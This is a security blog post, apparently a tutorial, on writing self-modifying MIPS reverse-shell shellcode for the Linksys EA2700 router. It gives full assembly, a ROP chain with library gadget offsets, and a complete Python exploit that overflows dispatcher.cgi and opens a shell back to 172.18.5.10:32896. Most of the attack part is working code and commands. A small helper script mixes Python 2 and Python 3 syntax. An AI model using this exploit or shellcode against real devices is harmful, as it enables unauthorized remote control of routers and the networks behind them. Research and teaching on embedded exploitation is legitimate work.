---
layout: post
title:  "Self Modifying Shellcode"
date:   2020-07-29 00:00:00 -0400
comments: true
categories: exploitation techniques
---

# Writing Shellcode for the Linksys EA2700
Below is an overview of writing self modifying shellcode for the Linksys EA2700 with firmware 1.0.14. It doesn't go over the exploit or how to exploit it, but full source code is given at the bottom.

## The Bad Bytes
EA2700 employs the open source project Lighttpd for its request server. The difficulty in writing shellcode for this device comes from  the large array of bytes it won't allow in requests shown in the small function below. 

![lighttpd bad bytes]({{site.baseurl}}/assets/images/shellcode/lighttpd_bad_bytes.png)

Based on that function invalid bytes are 0x00 - 0x20, 0x7F, and 0xFF. Depending on the exploit used, 0x23 is also a bad byte. It can be sent but will prematurely stop the overflow in a similar way a NULL byte does. This limits shellcode instructions to those that contain bytes 0x21, 0x22, 0x24-0x7F, and 0x80-0xFE. So what instructions does that leave us with? I used [this](http://www.mrc.uidaho.edu/mrc/people/jff/digital/MIPSir.html) site to examine instruction encodings which gave me a basic idea of what operations I could include and they are:

- addi, addiu
- andi, ori, xori
- lb, lh, lw
- lui
- sb, sh, sw
- slti, sltiu

For example, let's look at what makes an instruction invalid by examining `jr`'s encoding.

![jr operation]({{site.baseurl}}/assets/images/shellcode/jr_operation.png)

If we look specifically at the encoding: 

`0000 00ss sss0 0000 0000 0000 0000 1000`

Ignoring the register used, represented by 'ss ssss', the lower two bytes will be 0x00 and 0x08 which are both disallowed. The high byte, 0000 00ss, can have a max value of 0000 0011 (0x3) and a minimum value of 0000 0000 (0x0), which are all disallowed bytes. But, even though the instructions listed above have been identified as "good" instructions they can also result in invalid bytes depending on the registers or immediate values used. Let's look at two examples which, at first glance, look valid but are not. 

```
# Example 1
addiu $v0, $t0, 0x3050
addiu $t0, $v0, 0x3050

# Example 2
xori $s4, $s2, 0x177
xori $s4, $s2, 0x2177
```

And once compiled:

```
00400090 <_ftext>
	400090:		25023050	addiu v0,t0,12368
	400094:		24483050	addiu t0,v0,12368
	400098:		3a540177	xori s4,s2,0x177
	40009c:		3a542177	xori s4,s2,0x2177
```

Notice the changes when switching the register in the first example? 0x2502 versus 0x2448. The registers in `addiu $v0, $t0, 0x3050` resulted in a 0x02 being included which is the difference between the bytes being allowed versus not being allowed. Simply switching the order makes the instruction valid. In the second example attempting to xor a register with a small value introduces an invalid byte of 0x01. The list of invalid bytes mean the minimum value we can use for any immediate value is 0x2121. Even though we have a list of "supported" operations there is still trial and error involved in writing the shellcode. 

## The Shellcode
Now that we have a general idea of what instructions we can use in the shellcode, what do we want it to actually do? Well we want it to give us a shell obviously! My preferred solution for that is through a reverse shell. The example below is a simple reverse shell with no error checking that will connect back to 172.18.5.10:32896. 

```
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

void main()
{
    char *host = "172.18.5.10";
    int port = 32896;
    struct sockaddr_in host_addr;

    host_addr.sin_family = AF_INET;
    host_addr.sin_port = htons(port);
    host_addr.sin_addr.s_addr = inet_addr(host);
    
    int host_sock = socket(AF_INET, SOCK_STREAM, 0);
    connect(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
        
    dup2(host_sock, 0);
    dup2(host_sock, 1);
    dup2(host_sock, 2);
    
    execl("/bin/sh", "/bin/sh", NULL);
}
```

The first step in converting the C code to assembly is compiling it and running with `strace` to see what functions are actually executed. For example, `execl` translates to `execve` when executed. The relevant `strace` output is shown below:

![strace output]({{site.baseurl}}/assets/images/shellcode/strace.png)

Let's look at an example of calling a function in assembly. According to strace calling `socket` is equivalent to:

```
socket(PF_INET, SOCK_STREAM, IPPROTO_IP);
```

First, we need to identify what each of the defined values are equivalent to. You can either look in Linux header files if you have them installed or the internet will give you a pretty good idea. 

![socket defines]({{site.baseurl}}/assets/images/shellcode/socket_defines.png)

Based on the result of the `grep` above, the function can be simplified to this:

```
socket(2, 2, 0);
```

To call `socket` we invoke the `syscall` instruction which generates a software interrupt resulting in execution of a function based on the value in the `$v0` register. Based on [this site](https://syscalls.w3challs.com/?arch=mips_o32) `socket`'s syscall index is 0x1057. Arguments in MIPS are passed in the `$a0` - `$a3` registers so the assembly to call `socket` with appropriate arguments is:

```
li $a0, 2
li $a1, 2
li $a2, 0
li $v0, 0x1057
syscall
```

This implementation is completely ignoring lighttpd bad bytes, but we are taking this one step at a time and the first step for me was writing assembly that worked. My full conversion is shown below. 

```
.globl main
.text

main:
	# socket_descriptor = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
	li $a0, 2
	li $a1, 2
	li $a2, 0
	li $v0, 0x1057
	syscall
	move $fp, $v0

	# connect(socket_descriptor, sockaddr, 16)
    # Build sockaddr on the stack
    # struct sockaddr_in {
    #	short int sin_family;
    #	ushort int sin_port;
    #	struct in_addr sin_addr;
 	#	uchar sin_zero[8];
 	# }
	lui $a1, 0x8080			# sin_port = 32896
	ori $a1, 0x2			# sin_family = 2
	sw $a1, -12($sp)
	li $a1, 0x0A0512AC		# sin_addr = "172.18.5.10"
	sw $a1, -8($sp)
	sw $zero, -4($sp)

	move $a0, $fp
	addi $a1, $sp, -12
	li $a2, 16
	li $v0, 0x104a
	syscall

	# dup2(socket_descriptor, STDIN)
	move $a0, $fp
	li $a1, 0
	li $v0, 0xFDF
	syscall

	# dup2(socket_descriptor, STDOUT)
	move $a0, $fp
	li $a1, 1
	li $v0, 0xFDF
	syscall

	# dup2(socket_descriptor, STDERR)
	move $a0, $fp
	li $a1, 2
	li $v0, 0xFDF
	syscall

	# execv("/bin/sh", ["/bin/sh", NULL], NULL)
	# Build /bin/sh on the stack.
	lui $t0, 0x6e69
	ori $t0, 0x622f
	sw $t0, -20($sp)
	lui $t0, 0x68
	ori $t0, 0x732f
	sw $t0, -16($sp)

	addi $a0, $sp, -20
	sw $a0, -12($sp)
	sw $zero, -8($sp)
	addiu $a1, $sp, -12
	li $a2, 0
	li $v0, 0xfab
	syscall
```

I saved the file as `rs.s` then compiled and tested with these commands.

![Compile and run shellcode]({{site.baseurl}}/assets/images/shellcode/compile_sc.png)

The `strace` from my compiled assembly matches the strace of the compiled C code, so step one is complete. Now that we have working shellcode let's focus on removing the bad bytes. We'll focus on the first function and use `objdump -d rs` to look at the opcodes. 

```
00400090 <_ftext>
	400090: 	24040002	li $a0, 2
	400094:		24050002	li $a1, 2
	400098:		24060000	li $a2, 0
	40009c:		24021057	li $v0, 0x1057
	4000a0:		0000000C	syscall
```

Fifteen of the twenty bytes used to call socket cannot be sent to lighttpd so we need to fix that. Using the list of known operations we can send above I came up with this:

```
00400090 <_ftext>
	400090:		2b37fefe	slti $s7, $t9, -258
	400094:		26f62121	addiu $s6, $s7, 0x2121
	400098:		2ac42123	xori $a0, $s6, 0x2123
	40009c:		3ac52123	xori $a1, $s6, 0x2123
	4000a0:		3ac62121	xori $a2, $s6, 0x2121
	4000a4:		3ac23176	xori $v0, $s6, 0x3176
	4000a8:		0000000c	syscall
```

Address | Comments
--- | ---
400090 | $s7 = 0
400094 | $s6 = 0 + 0x2121
400098 | a0 = 0x2121 ^ 0x2123 = 2
40009C | a1 = 0x2121 ^ 0x2123 = 2
4000A0 | a2 = 0x2121 ^ 0x2121 = 0
4000A4 | v0 = 0x2121 ^ 0x3176 = 0x1057
4000A8 | We currently have no solution to fix this, so we'll leave it for now and come back to it. 

Performing the same task on the rest of the assembly required a little tweaking to the above function, but produced the same outcome. Here is the full assembly with all bad bytes removed except for the syscalls: 

```
.globl main
.text

main:
    slti $s7, $t9, -258
    addiu $s6, $s7, 0x3131
    
    # socket_descriptor = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    xori $a0, $s6, 0x3133
    xori $a1, $s6, 0x3133
    xori $a2, $s6, 0x3131
    xori $v0, $s6, 0x2166
    syscall
    addiu $fp, $v0, -0x2121

    # connect(socket_descriptor, sockaddr, 16)
    # Build sockaddr on the stack
    # struct sockaddr_in {
    #	short int sin_family;
    #	ushort int sin_port;
    #	struct in_addr sin_addr;
 	#	uchar sin_zero[8];
 	# }
    addiu $a0, $fp, 0x2121
    xori $t0, $s6, 0x3133
    sw $t0, -300($sp)
    addiu $t0, $s7,  0x8080
    sh $t0, -298($sp)
    xori $t0, $s6, 0x239d
    sw $t0, -296($sp)
    xori $t0, $s6, 0x3B34
    sw $t0, -294($sp)
    sw $s7, -292($sp)
    addi $a1, $sp, -300
    xori $a2, $s6, 0x3121
    xori $v0, $s6, 0x217B
    syscall

    # dup2(socket_descriptor, STDIN)
    addiu $a0, $fp, 0x2121
    xori $a1, $s6, 0x3131
    xori $v0, $s6, 0x3EEE
    syscall

    # dup2(socket_descriptor, STDOUT)
    addiu $a0, $fp, 0x2121
    xori $a1, $s6, 0x3130
    xori $v0, $s6, 0x3EEE
    syscall

    # dup2(socket_descriptor, STDERR)
    addiu $a0, $fp, 0x2121
    xori $a1, $s6, 0x3133
    xori $v0, $s6, 0x3EEE
    syscall

    # execv("/bin/sh", ["/bin/sh", NULL], NULL)
    # Build /bin/sh on the stack.
    addiu $t0, $s7, 0x622f
    sw $t0, -300($sp)
    addiu $t0, $s7, 0x6e69
    sw $t0, -298($sp)
    addiu $t0, $s7, 0x732f
    sw $t0, -296($sp)
    xori $t0, $s6, 0x3159
    sw $t0, -294($sp)

    addiu $a0, $sp, -300
    sw $a0, -288($sp)
    sw $zero, -292($sp)

    addiu $a1, $sp, -288
    xori $a2, $s6, 0x3131
    xori $v0, $s6, 0x3e9a
    syscall
```

## Self Modifying the Syscalls
The final task is to remove the bad bytes from the syscalls which, in my opinion, is the most difficult task. The syscall operation is encoded as 

`0000 00-- ---- ---- ---- ---- --00 1100`

The dashes can be a 1 or 0 so the high byte is limited to 0x00 - 0x03 and the low byte is limited to 0x0C, 0x4C, 0x8C, or 0xCC. For example, `0x027689CC` and `0x0000000C` are both interpreted as a `syscall` operation. But, remember, we can't sent any byte lower than 0x21 to the target. The high byte for a syscall is limited to a maximum of 0x03 which is well below the accepted minimum. The only option we have is to replace syscall instructions with place holder bytes, something like 0xFEFEFEFE, and self modify the instructions to change it to a syscall. In theory we just need to load the bytes for a syscall into a register and store that register at each offset where we need a syscall. Using the same setup as the assembly above something simple like this could be added:

```
addiu $s3, $t9, -0x2121
xori $s4, $s6, 0x313D
sw $s4, 0x2121+OFFSET_TO_INSTRUCTION($s3)
```

It's assumed we jumped to the shellcode using the $t9 register so we store that offset minus 0x2121 as a way to access offsets in our shellcode. For example, if we want the address of an instruction 0x30 bytes into our shellcode we can use `addiu $s1, $s3, 0x2151` because `$s3` holds `$t9 - 0x2121` and we avoid bad bytes. The `xori` instruction stores 0x0C in the `$s4` registers and the `sw` instruction stores that byte at an offset relative to our shellcode essentially creating a syscall. Unfortunately, thats only half the battle. Remember the separate data and instruction cache that MIPS, and other RISC architectures, maintain? That instruction we just updated still lives in the data cache and we need it to exist in main memory otherwise during execution the old placeholder bytes will be executed instead of the updated syscall instruction. We know from writing the ROP chain to send the NOP sled shellcode that a blocking operation like sleep or calling cacheflush will push our shellcode to main memory, so thats the same task we need to perform in our shellcode. You can use `cacheflush` or `nanosleep` to force a context switch, but i chose to call cacheflush. The updated shellcode is shown below.

```
.globl main
.text

main:
	addiu $s5, $t9, -0x3121
	slti $s7, $s5, -258
	addiu $s4, $s7, 0x248C

	sw $s4, %lo(socket_syscall - main + 0x3121)($s5)
	sw $s4, %lo(connect_syscall - main + 0x3121)($s5)
	sw $s4, %lo(dup2_stdin_syscall - main + 0x3121)($s5)
	sw $s4, %lo(dup2_stdout_syscall - main + 0x3121)($s5)
	sw $s4, %lo(dup2_stderr_syscall - main + 0x3121)($s5)
	sw $s4, %lo(execve_syscall - main + 0x3121)($s5)

	# cacheflush(START_OF_SHELLCODE, LENGTH_OF_SHELLCODE, BCACHE);
	addiu $a0, $s5, 0x3121
	xori $a1, $s4, 0x248C ^ (execve_syscall - main + 4)
	xori $a2, $s4, 0x248F
	xori $v0, $s4, 0x34BF
	syscall

	addiu $s6, $s7, 0x3131

	# call socket
	xori $a0, $s6, 0x3133
	xori $a1, $s6, 0x3133
	xori $a2, $s6, 0x3131
	xori $v0, $s6, 0x2166
socket_syscall:
	.byte 0xFE, 0xFE, 0xFE, 0xFE
	addiu $fp, $v0, -0x2121

	# call connect
	addiu $a0, $fp, 0x2121
	xori $s3, $s6, 0x3133
	sw $s3, -300($sp)
	addiu $s3, $s7,  0x8080
	sh $s3, -298($sp)
	xori $s3, 0x922C
	sw $s3, -296($sp)
	xori $s3, $s6, 0x3B34
	sw $s3, -294($sp)
	sw $s7, -292($sp)
	addiu $a1, $sp, -300
	xori $a2, $s6, 0x3121
	xori $v0, $s6, 0x217B
connect_syscall:
	.byte 0xFE, 0xFE, 0xFE, 0xFE
	
	# dup2(socket_descriptor, STDIN)
	addiu $a0, $fp, 0x2121
	xori $a1, $s6, 0x3131
	xori $v0, $s6, 0x3EEE
dup2_stdin_syscall:
	.byte 0xFE, 0xFE, 0xFE, 0xFE

	# dup2(socket_descriptor, STDOUT)
	addiu $a0, $fp, 0x2121
	xori $a1, $s6, 0x3130
	xori $v0, $s6, 0x3EEE
dup2_stdout_syscall:
	.byte 0xFE, 0xFE, 0xFE, 0xFE

	# dup2(socket_descriptor, STDERR)
	addiu $a0, $fp, 0x2121
	xori $a1, $s6, 0x3133
	xori $v0, $s6, 0x3EEE
dup2_stderr_syscall:
	.byte 0xFE, 0xFE, 0xFE, 0xFE

	# execv
	addiu $t0, $s7, 0x622f
	sw $t0, -300($sp)
	addiu $t0, $s7, 0x6e69
	sw $t0, -298($sp)

	addiu $t0, $s7, 0x732f
	sw $t0, -296($sp)
	xori $t0, $s6, 0x3159
	sw $t0, -294($sp)

	addiu $a0, $sp, -300
	sw $a0, -288($sp)
	sw $zero, -292($sp)

	addiu $a1, $sp, -288
	xori $a2, $s6, 0x3131
	xori $v0, $s6, 0x3e9a
execve_syscall:
	.byte 0xFE, 0xFE, 0xFE, 0xFE
```

Every `syscall`, with the exception of the first, has been replaced with placeholder bytes of 0xFEFEFEFE and a block of store word operations added to overwrite them with `syscall` on execution. Following the block of store words there is a call to cacheflush on the address of our shellcode. This is what enables us to self modify and execute. The only piece remaining is fixing up the first, and arguably most important, syscall. It can't be fixed after we jump to our shellcode because there is nothing to flush it's main memory at that point. Our only option is to modify it in our ROP chain prior to calling sleep.

## New Links in the Chain
At this point you likely have an exploit paired with a ROP chain that lands you on a, soon to be replaced, NOP sled. We need to add a few gadgets to that chain to modify our shellcode a little, specifically writing a syscall instruction. To accomplish this task there are two operations that we need to perform. First, we need to load the opcode for a syscall into a register. Easy enough. Second, we need to write that same register to a specific offset in our shellcode. Not so easy enough. Let's talk about a few techniques for loading the opcode for a `syscall`. First option is through subtracting registers.

```
subu $v0, $s1, $s0
```
If $s1 = 0x2121212D and $s0 = 0x21212121 then the result is equal to 0x0C. Another option is through adding immediate values.

```
addiu $s1, $v0, 0xC
```

If $v0 is equal to zero adding 0xC to it obviously equals 0x0C. You might even find adding two registers together with an overflow works.

```
addu $s1, $s3, $s4
```
$s3 equal to 0xAEAEAEBB and $s4 equal to 0x51515151 when added together using the unsigned version (this is important, `add` will raise an exception on overflow) will equal 0x10000000C. The overflow of 32 bits is dropped so $s1 is equal to 0x0C. Another option is to make use of string offsets.

```
addiu $a0, $v0, (aRo - 0x50000)		# As seen in IDA
addiu $a0, $v0, 0x3A4C				# As executed
```

If $v0 is equal to zero then $a0 will be set to 0x3A4C and based on our previous conversation about `syscall` bytes it can be used to create a `syscall`. One final option is the load immediate instruction.

```
li $s0, 0xC
```

This one is the most straight forward, simply load 0xC into $s0.  Next we need to overwrite our shellcode with the newly found opcodes. The choices for this are limited to store operations. 

```
sw $s1, 0x50($sp)
```

The store operations are more difficult to find because we need to have the opcode bytes for `syscall` in the register being stored and the bytes we want to overwrite need to be at the appropriate offset, in this case at 0x50 bytes on the stack. Adding these two gadgets types of gadgets, potentially one gadget if you're lucky, to your ROP chain can allow you to modify your shellcode and add a `syscall`. Here's an example of a ROP chain addition to modify shellcode on the stack by adding a `syscall` instruction.

```
# ROP 1
move $t9, $s1
jalr $t9
li $a2, 0xC

# ROP 2
move $t9, $s0
jalr $t9
sw $a2, 0x50($sp)
```

This example is as simple as it gets. Store 0xC in `$a2` and write that to 0x50 on the stack. Ideally the place holder bytes for the first syscall will be there and overwritten with an actual syscall. The ROP chain will continue at this point loading the small value into $a0, calling sleep, finding the shellcode, and jumping to it. This is a rather difficult chain to write and you might not find all the gadgets in libuClibc, I know I didn't. Don't be afraid to look in every library loaded by the CGI file. The full source for my shellcode and Python file are posted below, but before you look at it try to write your own solution. There are a few gotchas along the way, but you can always check the solution below for tips if you get stuck.


# Solution Shellcode
```
.globl main
.text

main:
	# Two instructions of padding to support the ROP chain.
	addiu $zero, $ra, -258
	addiu $zero, $ra, -258

	# This is where the ROP will actually land.
	addiu $s5, $t9, -0x3121		# Store $t9 - 0x3131 for later use.
	slti $s7, $s5, -258		# Store guaranteed 0 in $s7
	addiu $s4, $s7, 0x248C		# $s4 = 0x214C. Syscall instruction and xor constant
	addiu $s6, $s7, 0x3131

	# Fixup all syscalls in the shellcode. Offsets discovered using label math.
	# Minus 8 accounts for the two NOP instructions that are jumped passed
	# by the ROP chain.
	sw $s4, %lo(socket_syscall - main + 0x3121 - 8)($s5)
	sw $s4, %lo(connect_syscall - main + 0x3121 - 8)($s5)
	sw $s4, %lo(dup_stdout_syscall - main + 0x3121 - 8)($s5)
	sw $s4, %lo(dup2_stdin_syscall - main + 0x3121 - 8)($s5)
	sw $s4, %lo(dup2_stdout_syscall - main + 0x3121 - 8)($s5)
	sw $s4, %lo(dup2_stderr_syscall - main + 0x3121 - 8)($s5)
	sw $s4, %lo(execve_syscall - main + 0x3121 - 8)($s5)

	# Call cacheflush to flush syscall fix-up to main memory.
	# cacheflush(SHELLCODE_ADDR, SHELLCODE_LENGTH, BCACHE);
	addiu $a0, $s5, 0x3121
	xori $a1, $s4, 0x248C ^ (execve_syscall - main + 4)
	xori $a2, $s4, 0x248F
	xori $v0, $s4, 0x34BF
	addiu $zero, $ra, -258
	addiu $zero, $ra, -258
	addiu $zero, $ra, -258
cacheflush_syscall:
	.byte 0xFE, 0xFE, 0xFE, 0xFE

	# socket_descriptor = socket(2, 2, 0);
	xori $a0, $s6, 0x3133
	xori $a1, $s6, 0x3133
	xori $a2, $s6, 0x3131
	xori $v0, $s6, 0x2166
socket_syscall:
	.byte 0xFE, 0xFE, 0xFE, 0xFE
	addiu $fp, $v0, -0x2121

	# connect(socket_descriptor, sockaddr_in, 16);
	addiu $a0, $fp, 0x2121
	xori $s3, $s6, 0x3133
	sw $s3, -300($sp)
	addiu $s3, $s7,  0x8080
	sh $s3, -298($sp)
	xori $s3, 0x922C
	sw $s3, -296($sp)
	xori $s3, $s6, 0x3B34
	sw $s3, -294($sp)
	sw $s7, -292($sp)
	addiu $a1, $sp, -300
	xori $a2, $s6, 0x3121
	xori $v0, $s6, 0x217B
connect_syscall:
	.byte 0xFE, 0xFE, 0xFE, 0xFE

	# dup(STDOUT)
	# Special case for this router. If STDIN file descriptor
	# is closed the program crashes so copy it when dup(),
	# when dup2() is called it will no longer crash.
	xori $a0, $s6, 0x3130
	xori $v0, $s6, 0x3EF8
dup_stdout_syscall:
	.byte 0xFE, 0xFE, 0xFE, 0xFE

	# dup2(socket_descriptor, STDIN)
	addiu $a0, $fp, 0x2121
	xori $a1, $s6, 0x3131
	xori $v0, $s6, 0x3EEE
dup2_stdin_syscall:
	.byte 0xFE, 0xFE, 0xFE, 0xFE

	# dup2(socket_descriptor, STDOUT)
	addiu $a0, $fp, 0x2121
	xori $a1, $s6, 0x3130
	xori $v0, $s6, 0x3EEE
dup2_stdout_syscall:
	.byte 0xFE, 0xFE, 0xFE, 0xFE

	# dup2(socket_descriptor, STDERR)
	addiu $a0, $fp, 0x2121
	xori $a1, $s6, 0x3133
	xori $v0, $s6, 0x3EEE
dup2_stderr_syscall:
	.byte 0xFE, 0xFE, 0xFE, 0xFE

	# execv("/bin/sh", ["/bin/sh", NULL], NULL);
	addiu $t0, $s7, 0x622f
	sw $t0, -300($sp)
	addiu $t0, $s7, 0x6e69
	sw $t0, -298($sp)

	addiu $t0, $s7, 0x732f
	sw $t0, -296($sp)
	xori $t0, $s6, 0x3159
	sw $t0, -294($sp)

	addiu $a0, $sp, -300
	sw $a0, -288($sp)
	sw $zero, -292($sp)

	addiu $a1, $sp, -288
	xori $a2, $s6, 0x3131
	xori $v0, $s6, 0x3e9a
execve_syscall:
	.byte 0xFE, 0xFE, 0xFE, 0xFE
```

# Compile It
Compiled and shellcode pulled out with these commands:

```
> as rs.s -o rs.o
> ld rs.o -o rs
> objcopy -O binary -j .text rs rs.bin
```

I then used a quick and dirty Python script to read `rs.bin` and convert it to a string I can paste directly into my exploit script. It's Python 3 for the record. 

```
with open('rs.bin', 'rb') as x:
	y = x.read()
	
a = []
for z in y:
	a.append('\\' + hex(z)[1:])
print ''.join(a))
```

# Exploit It
Here's the full Python script to exploit the EA2700 listening at 172.18.5.55:8080 with shellcode that will call back to 172.18.5.10:32896.

```
import socket
import struct

# -----------------------------------------------------------------------
# | Gadget Name | Gadget Offset  | Gadget Summary                       |
# -----------------------------------------------------------------------
# | rop1        | libwl_agent.so | move    $t9, $s1                     |
# |             | 0x14E8         | jalr    $t9                          |
# |             |                | li      $a2, 0xC                     |
# -----------------------------------------------------------------------
# | rop2        | libgcc_s.so    | move    $t9, $s0                     |
# |             | 0xD38C         | jalr    $t9 ; sub_CD0C               |
# |             |                | sw      $a2, 0x50($sp)               |
# -----------------------------------------------------------------------
# | rop3        | libuClibc.so   | addiu   $sp, -0x18                   |
# |             | 0x427A4        | addiu   $s0, $sp, 0xB8+var_98        |
# |             |                | lw      $a0, 0($s2)                  |
# |             |                | move    $a1, $s1                     |
# |             |                | move    $a2, $s4                     |
# |             |                | move    $t9, $s6                     |
# |             |                | jalr    $t9                          |
# |             |                | move    $a3, $s0                     |
# -----------------------------------------------------------------------
# | rop4        | libuClibc.so   | li      $a0, 0xE                     |
# |             | 0x494EC        | move    $t9, $s4                     |
# |             |                | jalr    $t9                          |
# |             |                | move    $a2, $zero                   |
# -----------------------------------------------------------------------
# | rop5        | libuClibc.so   | move    $t9, $s2                     |
# |             | 0x312E0        | jalr    $t9                          |
# |             |                | move    $a1, $v0                     |
# |             |                | lw      $gp, 0x10($sp)               |
# |             |                | la      $t9, strlen                  |
# |             |                | move    $t9, $s3                     |
# |             |                | jalr    $t9                          |
# |             |                | move    $a0, $s0                     |
# -----------------------------------------------------------------------
# | rop6        | libuClibc.so   | move    $t9, $s0                     |
# |             | 0x18A44        | jalr    $t9                          |
# |             |                | addiu   $a1, $v0, 0x3708  # "blank"  |
# -----------------------------------------------------------------------
#
# rop1 - Load 0xC in $a2. Syscall bytes are 0x0000000C so this sets up the
#        first modification.
# rop2 - The opcode for syscall will be written to 0x50 on the stack. If
#        everything has been set up properly in the shellcode and rop chain
#        this will overwrite the first instance of 0xFEFEFEFE with 0x0000000C
#        creating our first syscall.
# rop3 - Move the stack pointer back so we can more easily find the start of
#        the shellcode. This gadget also finds our shellcode on the stack at
#        $sp + 0x20. We moved the stack back 0x18, but access it at 0x20 so we
#        jump past 0x8 bytes, or two operations, in the shellcode. We need
#        those two operations for padding so they exist as NOPs to push the
#        syscall offset to 0x50.
# rop4 - Move a small value into $a0 for a future call to sleep.
# rop5 - Call sleep and jump to the next gadget.
# rop6 - Call our shellcode on the stack.


ip = '172.18.5.55'
port = 8080
request_page = "dispatcher.cgi"

libc_base = 0x2aed6000
libwl_agent_base = 0x2af74000
libgcc_base = 0x2ae86000
sleep = struct.pack('<L', libc_base + 0x506C0)

rop1 = struct.pack('<L', libwl_agent_base + 0x14E8)
rop2 = struct.pack('<L', libgcc_base + 0xd38c)
rop3 = struct.pack('<L', libc_base + 0x427A4)
rop4 = struct.pack('<L', libc_base + 0x2512C)
rop5 = struct.pack('<L', libc_base + 0x312E0)
rop6 = struct.pack('<L', libc_base + 0x18A44)


# Multi-step self modifying shellcode. The ROP chain will fixup a syscall
# operation at 0x50 that will execute cacheflush. The cacheflush is performed
# after fixing up all syscall operation in the entire shellcode represented by
# place holder bytes of 0xFEFEFEFE.
shellcode = '\xfe\xfe\xe0\x27\xfe\xfe\xe0\x27\xdf\xce\x35\x27\xfe\xfe' + \
            '\xb7\x2a\x8c\x24\xf4\x26\x31\x31\xf6\x26\x7d\x31\xb4\xae' + \
            '\xb9\x31\xb4\xae\xc5\x31\xb4\xae\xd5\x31\xb4\xae\xe5\x31' + \
            '\xb4\xae\xf5\x31\xb4\xae\x31\x32\xb4\xae\x21\x31\xa4\x26' + \
            '\x90\x25\x85\x3a\x8f\x24\x86\x3a\xbf\x34\x82\x3a\xfe\xfe' + \
            '\xe0\x27\xfe\xfe\xe0\x27\xfe\xfe\xe0\x27\xfe\xfe\xfe\xfe' + \
            '\x33\x31\xc4\x3a\x33\x31\xc5\x3a\x31\x31\xc6\x3a\x66\x21' + \
            '\xc2\x3a\xfe\xfe\xfe\xfe\xdf\xde\x5e\x24\x21\x21\xc4\x27' + \
            '\x33\x31\xd3\x3a\xd4\xfe\xb3\xaf\x80\x80\xf3\x26\xd6\xfe' + \
            '\xb3\xa7\x2c\x92\x73\x3a\xd8\xfe\xb3\xaf\x34\x3b\xd3\x3a' + \
            '\xda\xfe\xb3\xaf\xdc\xfe\xb7\xaf\xd4\xfe\xa5\x27\x21\x31' + \
            '\xc6\x3a\x7b\x21\xc2\x3a\xfe\xfe\xfe\xfe\x30\x31\xc4\x3a' + \
            '\xf8\x3e\xc2\x3a\xfe\xfe\xfe\xfe\x21\x21\xc4\x27\x31\x31' + \
            '\xc5\x3a\xee\x3e\xc2\x3a\xfe\xfe\xfe\xfe\x21\x21\xc4\x27' + \
            '\x30\x31\xc5\x3a\xee\x3e\xc2\x3a\xfe\xfe\xfe\xfe\x21\x21' + \
            '\xc4\x27\x33\x31\xc5\x3a\xee\x3e\xc2\x3a\xfe\xfe\xfe\xfe' + \
            '\x2f\x62\xe8\x26\xd4\xfe\xa8\xaf\x69\x6e\xe8\x26\xd6\xfe' + \
            '\xa8\xaf\x2f\x73\xe8\x26\xd8\xfe\xa8\xaf\x59\x31\xc8\x3a' + \
            '\xda\xfe\xa8\xaf\xd4\xfe\xa4\x27\xe0\xfe\xa4\xaf\xdc\xfe' + \
            '\xa0\xaf\xe0\xfe\xa5\x27\x31\x31\xc6\x3a\x9a\x3e\xc2\x3a' + \
            '\xfe\xfe\xfe\xfe'

# Set up overflow variables for ease of use.
# 13 -> length of www string
# 6 -> length of common.js.pdf.gz
padding_to_registers = 'A'* (0x508 - (13 + 16))

s0 = rop3
s1 = rop2
s2 = sleep
s3 = rop6
s4 = rop5
s5 = 'FFFF'
s6 = rop4
s7 = 'IIII'
fp = sleep
ra = rop1

overflow = padding_to_registers + \
           s0 + s1 + s2 + s3 + s4 + s5 + s6 + s7 + fp + ra + \
           shellcode

# Build the URL.
packet = 'GET /dispatcher.cgi?template=common.js.pdf.gz%s HTTP/1.1\r\n' % overflow
packet += 'Host: %s:%d\r\n' % (ip, port)
packet += 'User-Agent: useragent\r\n\r\n'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))
sock.send(packet)
print sock.recv(2048)
sock.close
```



